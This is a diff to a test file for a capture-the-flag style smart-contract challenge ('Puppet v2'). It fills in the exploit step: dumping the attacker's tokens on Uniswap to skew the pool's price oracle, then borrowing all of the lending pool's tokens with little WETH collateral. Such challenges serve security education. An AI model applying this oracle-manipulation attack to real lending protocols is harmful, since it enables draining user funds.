@@ -81,7 +81,33 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Swap all of tokens for wETH from uniswap
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        const deadline = await ethers.provider.getBlock().then(b => b.timestamp + 1000);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            deadline
+        );
+
+        // wETH required to borrow all of pool's tokens
+        const wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        // Calculate amount of wETH required more so that all of wETH from pool can be borrowed
+        let attackerWethBal = await this.weth.balanceOf(attacker.address);
+        const amountToSend = wethRequired.sub(attackerWethBal);
+
+        // Deposit Eth to receive wEth of same amount
+        await this.weth.connect(attacker).deposit({ value: amountToSend });
+       
+        // wEth balance after exchanging with Eth
+        attackerWethBal = await this.weth.balanceOf(attacker.address);
+
+        // Borrow all of tokens from lending pool
+        await this.weth.connect(attacker).approve(this.lendingPool.address, attackerWethBal);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
